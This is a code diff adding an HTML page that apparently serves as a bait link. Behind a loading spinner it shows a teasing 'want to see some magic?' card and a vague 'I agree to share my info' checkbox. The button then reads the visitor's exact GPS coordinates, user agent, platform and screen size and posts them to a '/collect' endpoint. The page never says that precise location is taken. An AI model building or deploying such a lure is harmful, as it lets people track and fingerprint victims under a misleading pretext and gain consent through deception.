@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Explore</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            background: url("https://wallpapers.com/images/hd/flying-broomstick-shinchan-aesthetic-dxawp880blvyt95g.jpg") no-repeat center center/cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* 🔥 LOADER SCREEN */
+        .loader-screen {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #444;
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        /* 🔥 MAIN CONTENT */
+        .card {
+            width: 90%;
+            max-width: 350px;
+            padding: 25px;
+            border-radius: 20px;
+
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(12px);
+
+            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+
+            text-align: center;
+            color: white;
+
+            display: none; 
+        }
+
+        h1 {
+            font-size: 28px;
+        }
+
+        p {
+            font-size: 15px;
+            color: #ddd;
+            margin: 15px 0;
+        }
+
+        label {
+            font-size: 14px;
+        }
+
+        input {
+            transform: scale(1.3);
+        }
+
+        button {
+            margin-top: 20px;
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: none;
+
+            background: linear-gradient(135deg, #3b82f6, #6366f1);
+            color: white;
+            font-size: 16px;
+
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(99,102,241,0.8);
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- 🔄 Loader -->
+<div class="loader-screen" id="loader">
+    <div class="spinner"></div>
+</div>
+
+<!-- 💎 Main UI -->
+<div class="card" id="mainCard">
+    <h1>AA GYE AP👀</h1>
+    <p>LAADLE KUCH JAADU DEKHNA?</p>
+
+    <label>
+        <input type="checkbox" id="consent">
+        I agree to share my info
+    </label>
+
+    <button onclick="sendData()">Let's explore then</button>
+</div>
+
+<script>
+// 🔥 Loader logic
+window.onload = function() {
+    setTimeout(() => {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("mainCard").style.display = "block";
+    }, 2000); 
+};
+
+function sendData() {
+    const consent = document.getElementById("consent").checked;
+
+    if (!consent) {
+        alert("Please give consent first!");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(function(pos) {
+        const data = {
+            device: navigator.userAgent,
+            platform: navigator.platform,
+            screen: window.screen.width + "x" + window.screen.height,
+            location: pos.coords.latitude + ", " + pos.coords.longitude
+        };
+
+        fetch('/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        alert("Exploring...");
+    },
+    function() {
+        alert("Location permission denied");
+    });
+}
+</script>
+
+</body>
+</html>
